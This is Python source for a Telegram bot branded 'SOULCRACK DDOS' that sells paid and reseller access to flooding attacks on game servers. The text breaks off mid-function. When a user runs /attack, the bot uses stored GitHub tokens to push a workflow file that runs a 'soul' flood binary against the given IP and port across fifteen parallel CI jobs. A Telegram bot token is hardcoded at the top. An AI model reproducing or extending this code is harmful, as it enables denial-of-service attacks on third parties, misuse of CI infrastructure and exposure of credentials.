import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException

from keep_alive import keep_alive
keep_alive()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8499935979:AAEnf4tWEWwCRDjoYuRajH9KZR54FREAvVU"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
# ADMIN_IDS = [521756472, 7733336238,7772881209] 
ADMIN_IDS = [6761752864]
OWNER_IDS = [6820056931]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6


current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 5
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}  

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}


def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 5)
    except FileNotFoundError:
        return 5

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)


authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)


def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        return False, "⚠️ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."
    
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ᴜsᴇᴅ ᴀʟʟ {MAX_ATTACKS} ᴀᴛᴛᴀᴄᴋ(s). ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ."
    
    if current_attack is not None:
        return False, "⚠️ **ᴇʀʀᴏʀ: ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇs ᴏʀ 40 sᴇᴄᴏɴᴅs ᴄᴏᴏʟᴅᴏᴡɴ."
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{remaining_time}` sᴇᴄᴏɴᴅs ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
    
    return True, "✅ ʀᴇᴀᴅʏ ᴛᴏ sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "ɢᴀᴍᴇ"
    elif ip.startswith(('99', '96')):
        return None, "⚠️ ɪɴᴠᴀʟɪᴅ ɪᴘ - ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '99' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ"
    else:
        return "BGMI FLOOD", "ɢᴀᴍᴇ"

def is_valid_ip(ip):
    return not ip.startswith(('99', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()
    
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    
    return {"status": "ready"}


def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)  
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    if key not in trial_keys:
        return False, "ɪɴᴠᴀʟɪᴅ ᴋᴇʏ"
    key_data = trial_keys[key]
    if key_data["used"]:
        return False, "ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ"
    if time.time() > key_data["expiry"]:
        return False, "ᴋᴇʏ ᴇxᴘɪʀᴇᴅ"
    
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)
    return True, f"✅ ᴛʀɪᴀʟ ᴀᴄᴄᴇss ᴀᴄᴛɪᴠᴀᴛᴇᴅ ғᴏʀ {key_data['hours']} ʜᴏᴜʀs!"


def create_repository(token, repo_name="soulcrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(repo_name, description="SOULCRACK DDOS Bot Repository", private=False, auto_init=False)
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack parameters - {ip}:{port} ({method})", yml_content, file_content.sha)
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack parameters - {ip}:{port} ({method})", yml_content)
            logger.info(f"✅ Created configuration for {repo_name}")
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        return total_cancelled
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("🔧 **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ɪᴛ's ʙᴀᴄᴋ.")
        return
    
    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break
        if not user_exists:
            pending_users.append({"user_id": user_id, "username": update.effective_user.username or f"user_{user_id}", "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_pending_users(pending_users)
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(chat_id=int(owner_id), text=f"📥 **ɴᴇᴡ ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴜsᴇʀ: @{update.effective_user.username or 'No username'}\nɪᴅ: `{user_id}`\nᴜsᴇ /add {user_id} 7 ᴛᴏ ᴀᴘᴘʀᴏᴠᴇ")
                except: pass
        await update.message.reply_text("📋 **ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ sᴇɴᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜʀ ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ᴀᴅᴍɪɴ.\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n\nᴜsᴇ /id ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\nᴜsᴇ /help ғᴏʀ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs\n\n💡 **ᴡᴀɴᴛ ᴀ ᴛʀɪᴀʟ?**\nᴀsᴋ ᴀᴅᴍɪɴ ғᴏʀ ᴀ ᴛʀɪᴀʟ ᴋᴇʏ ᴏʀ ʀᴇᴅᴇᴇᴍ ᴏɴᴇ ᴡɪᴛʜ /redeem <ᴋᴇʏ>")
        return
    
    attack_status = get_attack_status()
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        await update.message.reply_text(f"🔥 **ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\n🌐 ᴛᴀʀɢᴇᴛ: `{attack['ip']}:{attack['port']}`\n⏱️ ᴇʟᴀᴘsᴇᴅ: `{attack_status['elapsed']}s`\n⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}s`")
        return
    if attack_status["status"] == "cooldown":
        await update.message.reply_text(f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{attack_status['remaining_cooldown']}s`\nʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ.")
        return

    user_role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
    if is_owner(user_id): user_role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ" if is_primary_owner(user_id) else "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id): user_role = "🛡️ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id): user_role = "💰 ʀᴇsᴇʟʟᴇʀ"

    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_count
    
    await update.message.reply_text(
        f"🤖 **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ** 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n{user_role}\n━━━━━━━━━━━━━━━━━━━━━━\n\n🎯 **ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:** {remaining_attacks}/{MAX_ATTACKS}\n\n📋 **ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs:**\n━━━━━━━━━━━━━━━━━━━━━━\n• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n• /status - ᴄʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs\n• /stop - sᴛᴏᴘ ᴀʟʟ ᴀᴛᴛᴀᴄᴋs\n• /id - ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n• /myaccess - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss\n• /help - sʜᴏᴡ ʜᴇʟᴘ\n• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n━━━━━━━━━━━━━━━━━━━━━━\n\n📢 **ɴᴏᴛᴇs:**\n• ᴏɴʟʏ ᴏɴᴇ ᴀᴛᴛᴀᴄᴋ ᴀᴛ ᴀ ᴛɪᴍᴇ\n• {COOLDOWN_DURATION}s ᴄᴏᴏʟᴅᴏᴡɴ ᴀғᴛᴇʀ ᴀᴛᴛᴀᴄᴋ\n• ɪɴᴠᴀʟɪᴅ ɪᴘs: '99', '96'"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id) or is_admin(user_id):
        await update.message.reply_text("🆘 **ʜᴇʟᴘ - ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs**\n━━━━━━━━━━━━━━━━━━━━━━\n**ғᴏʀ ᴀʟʟ ᴜsᴇʀs:**\n• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n• /status, /stop, /id, /myaccess, /help, /redeem\n\n**ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:**\n• /add, /remove, /userslist, /approveuserslist, /ownerlist, /adminlist, /resellerlist, /pricelist, /resellerpricelist, /listgrp, /maintenance, /broadcast, /setcooldown, /setmaxattack, /gentrailkey, /addtoken, /tokens, /removetoken, /removexpiredtoken, /binary_upload, /addowner, /deleteowner, /addreseller, /removereseller\n━━━━━━━━━━━━━━━━━━━━━━")
    elif can_user_attack(user_id):
        await update.message.reply_text("🆘 **ʜᴇʟᴘ - ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs**\n━━━━━━━━━━━━━━━━━━━━━━\n• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n• /status, /stop, /id, /myaccess, /help, /redeem\n━━━━━━━━━━━━━━━━━━━━━━")
    else:
        await update.message.reply_text(f"🆘 **ʜᴇʟᴘ**\n━━━━━━━━━━━━━━━━━━━━━━\n• /id - ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n• /help - sʜᴏᴡ ʜᴇʟᴘ\n• /redeem <ᴋᴇʏ>\n━━━━━━━━━━━━━━━━━━━━━━\n**ʏᴏᴜʀ ɪᴅ:** `{user_id}`")

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id, username = update.effective_user.id, update.effective_user.username or "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
    await update.message.reply_text(f"🆔 **ʏᴏᴜʀ ᴜsᴇʀ ɪᴅᴇɴᴛɪғɪᴄᴀᴛɪᴏɴ**\n━━━━━━━━━━━━━━━━━━━━━━\n• **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n• **ᴜsᴇʀɴᴀᴍᴇ:** @{username}\n━━━━━━━━━━━━━━━━━━━━━━")

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    role, expiry = "⏳ ᴘᴇɴᴅɪɴɢ", "ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ"
    if is_owner(user_id): role, expiry = ("👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ" if is_primary_owner(user_id) else "👑 ᴏᴡɴᴇʀ"), "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id): role, expiry = "🛡️ ᴀᴅᴍɪɴ", "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id) or is_approved_user(user_id):
        data = resellers.get(str(user_id)) if is_reseller(user_id) else approved_users.get(str(user_id))
        role = "💰 ʀᴇsᴇʟʟᴇʀ" if is_reseller(user_id) else "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
        exp_val = data.get('expiry', '?')
        if exp_val == 'LIFETIME': expiry = 'ʟɪғᴇᴛɪᴍᴇ'
        else:
            try: expiry = time.strftime("%Y-%ᴍ-%ᴅ", time.localtime(float(exp_val))) if time.time() < float(exp_val) else "ᴇxᴘɪʀᴇᴅ"
            except: pass
    
    current_attacks = user_attack_counts.get(str(user_id), 0)
    await update.message.reply_text(f"🔐 **ʏᴏᴜʀ ᴀᴄᴄᴇss ɪɴғᴏ**\n━━━━━━━━━━━━━━━━━━━━━━\n• **ʀᴏʟᴇ:** {role}\n• **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n• **ᴇxᴘɪʀʏ:** {expiry}\n• **ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:** {MAX_ATTACKS - current_attacks}/{MAX_ATTACKS}\n━━━━━━━━━━━━━━━━━━━━━━")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴜsᴇ /start ᴛᴏ ʀᴇǫᴜᴇsᴛ ᴀᴄᴄᴇss.")
        return
    can_start, msg = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg)
        return
    if len(context.args) != 3:
        await update.message.reply_text("❌ **ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx**\n━━━━━━━━━━━━━━━━━━━━━━\nᴜsᴀɢᴇ: /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>")
        return
    if not github_tokens:
        await update.message.reply_text("❌ **ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ**")
        return
    
    ip, port, time_val = context.args
    if not is_valid_ip(ip):
        await update.message.reply_text("⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n━━━━━━━━━━━━━━━━━━━━━━\nɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '99' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ.")
        return
    
    method, method_name = get_attack_method(ip)
    if method is None:
        await update.message.reply_text(f"⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n━━━━━━━━━━━━━━━━━━━━━━\n{method_name}")
        return
    
    try:
        attack_duration = int(time_val)
        if attack_duration <= 0: raise ValueError
    except ValueError:
        await update.message.reply_text("❌ **ɪɴᴠᴀʟɪᴅ ᴛɪᴍᴇ**")
        return
    
    start_attack(ip, port, time_val, user_id, method)
    progress_msg = await update.message.reply_text("🔄 **sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ...**")
    
    results = []
    def update_single_token(t_data):
        try: results.append(update_yml_file(t_data['token'], t_data['repo'], ip, port, time_val, method))
        except: results.append(False)
    
    threads = [threading.Thread(target=update_single_token, args=(td,)) for td in github_tokens]
    for t in threads: t.start()
    for t in threads: t.join()
    
    success_count = sum(1 for r in results if r)
    rem = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    await progress_msg.edit_text(f"🎯 **ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ!**\n━━━━━━━━━━━━━━━━━━━━━━\n🌐 ᴛᴀʀɢᴇᴛ: `{ip}:{port}`\n⏱️ ᴛɪᴍᴇ: `{time_val}s`\n🖥️ sᴇʀᴠᴇʀs: `{success_count}`\n⚡ ᴍᴇᴛʜᴏᴅ: {method_name}\n⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s\n🎯 ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs: {rem}/{MAX_ATTACKS}")

    def monitor():
        time.sleep(attack_duration)
        finish_attack()
    threading.Thread(target=monitor, daemon=True).start()

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("❌ **ᴀᴅᴍɪɴ ᴏɴʟʏ**")
        return
    stop_attack()
    results = []
    def stop_single(t_data):
        try: results.append(instant_stop_all_jobs(t_data['token'], t_data['repo']))
        except: results.append(0)
    threads = [threading.Thread(target=stop_single, args=(td,)) for td in github_tokens]
    for t in threads: t.start()
    for t in threads: t.join()
    await update.message.reply_text(f"🛑 **ᴀʟʟ ᴀᴛᴛᴀᴄᴋs sᴛᴏᴘᴘᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴛᴏᴛᴀʟ ᴊᴏʙs ᴄᴀɴᴄᴇʟʟᴇᴅ: `{sum(results)}`")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_attack_status()
    if s["status"] == "running":
        a = s["attack"]
        await update.message.reply_text(f"🔥 **ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs: ʀᴜɴɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\n🌐 ᴛᴀʀɢᴇᴛ: `{a['ip']}:{a['port']}`\n⚡ ᴍᴇᴛʜᴏᴅ: {a['method']}\n⏱️ ᴇʟᴀᴘsᴇᴅ: `{s['elapsed']}s`\n⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{s['remaining']}s`")
    elif s["status"] == "cooldown":
        await update.message.reply_text(f"⏳ **sᴛᴀᴛᴜs: ᴄᴏᴏʟᴅᴏᴡɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nʀᴇᴍᴀɪɴɪɴɢ: `{s['remaining_cooldown']}s`")
    else:
        await update.message.reply_text("✅ **sᴛᴀᴛᴜs: ʀᴇᴀᴅʏ**\n━━━━━━━━━━━━━━━━━━━━━━\nɴᴏ ᴀᴛᴛᴀᴄᴋ ᴄᴜʀʀᴇɴᴛʟʏ ʀᴜɴɴɪɴɢ.")

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text("❌ **ɴᴏ ᴘᴇʀᴍɪssɪᴏɴ**")
        return
    if len(context.args) != 2:
        await update.message.reply_text("ᴜsᴀɢᴇ: /add <ᴜsᴇʀ_ɪᴅ> <ᴅᴀʏs>")
        return
    target_id, days = context.args[0], int(context.args[1])
    exp = time.time() + (days * 86400)
    approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": str(user_id), "added_date": time.strftime("%Y-%m-%d"), "expiry": exp, "days": days}
    save_approved_users(approved_users)
    await update.message.reply_text(f"✅ **ᴜsᴇʀ {target_id} ᴀᴅᴅᴇᴅ ғᴏʀ {days} ᴅᴀʏs**")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not (is_owner(update.effective_user.id) or is_admin(update.effective_user.id)):
        return
    if not context.args: return
    tid = str(context.args[0])
    if tid in approved_users:
        del approved_users[tid]
        save_approved_users(approved_users)
        await update.message.reply_text(f"✅ ʀᴇᴍᴏᴠᴇᴅ {tid}")

async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not (is_owner(update.effective_user.id) or is_admin(update.effective_user.id)): return
